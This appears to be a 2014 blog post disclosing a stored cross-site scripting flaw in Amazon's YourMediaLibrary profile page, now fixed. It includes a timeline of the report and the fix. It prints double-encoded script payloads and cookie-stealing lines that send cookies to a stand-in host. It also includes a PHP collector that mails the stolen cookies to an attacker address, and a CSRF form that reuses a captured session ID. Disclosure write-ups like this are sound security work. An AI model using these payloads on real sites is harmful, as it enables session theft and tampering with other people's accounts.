---
layout: post
title:  "Disclosure: Stored XSS in Amazon.com with CSRF Bypass"
date:   2014-06-02 09:20:01
categories: responsible-disclosure
permalink: post/stored-xss-in-amazon-com-with-csrf-bypass/
---

### Description

The **Amazon YourMediaLibrary** is vulnerable to stored `XSS Vulnerability`, the attacker can redirect an user to his profile page and steal user-cookie to perform an `CSRF Attack`.

> Your Media Library is a secure location from which you retrieve all digital products, including eDocs, Amazon Upgrades, the free electronic user manuals that come with some products, and free music files that are available with select CDs.

### Proof of Concept of Stored XSS - [Double Encoding Technique][encoding]:

[encoding]: https://www.owasp.org/index.php/Double_Encoding "OSWAP - Double Encoding Technique"

**Let's go:**

* First go to yourmedialibrary page [Amazon YourMediaLibrary](https://www.amazon.com/gp/ays/index.html, "Amazon YourMediaLibrary") and click to Profile
* Insert this vector into `Interests` or `In my own words` inputs:

		%253Cscript%253Ealert(document.cookie)%253C%252Fscript%253E

* Wait for auto-saving or click “Save”
* Back to profile page to see the injected code

### Possible Attack Scenario with CSRF SessionID Bypass:

Since many values of cookie were setted like **HttpOnly**, the malicious user can’t hijack the session but anyway It can execute an arbiratry operations through an `CSRF Attack` knowning the `session-id` saved in the `user-cookie` (however the session-id does the function of security-token):

1. Generate a base html payload to steal user cookie:

		<script>
			location.href='//land-domain.com/steal.php?cookie='+document.cookie;
		</script>

2. Or if you want a payload without redirect:

		<img style='display:none' src=x onerror=this.src='//land-domain.com/?cookie='+document.cookie>

3. Attacker adds this double encoded vector into his interests in settings profile page:

		%253Cscript%253Elocation.href%253D%2527//land-domain.com/steal.php
		%252Fcookie=%2527%252Bdocument.cookie%253C%252Fscript%253E

4. Then It redirects the user to his medialibrary profile page to steal and store cookie by remote malicious file (basic steal.php)

		$ echo "
		<?php
		  mail('attacker@mailz.org', 'Cookie', $_GET['cookie']);
		  header('Location: '.$_SERVER['HTTP_REFERER']);
		?>" > /var/www/land-domain.com/steal.php

5. Now he’s got a ‘session-id=180-0536506-4528302′ of user (that is not secured).

6. With this simple CSRF page:

		<html>
		<head>
			<title>Amazon CSRF</title>
		</haed>
		<body>
			<form method="POST" action="https://www.amazon.com/gp/ays/ajax/setProfile.html">
				<input type="hidden" name="key" value="inMyOwnWords">
				<input type="hidden" name="value" value="injected">
				<input type="hidden" name="sessionId" value="180-0536506-4528302">
			</form>
		</body>
		</html>

7. The malicious user can change all profile settings of user.

### Example demostration screen

<a href="/images/security/responsible-disclosure/amazon-xss.png">![Prestashop Demo XSS](/images/security/responsible-disclosure/amazon-xss.png)</a>

### Disclosure:

* **28/05/2014** – Report to Amazon Security Team
* **29/05/2014** – Received a response from amazon that assign a ticket
* **01/06/2014** – Amazon fix the bug
* **02/06/2014** – Public disclosure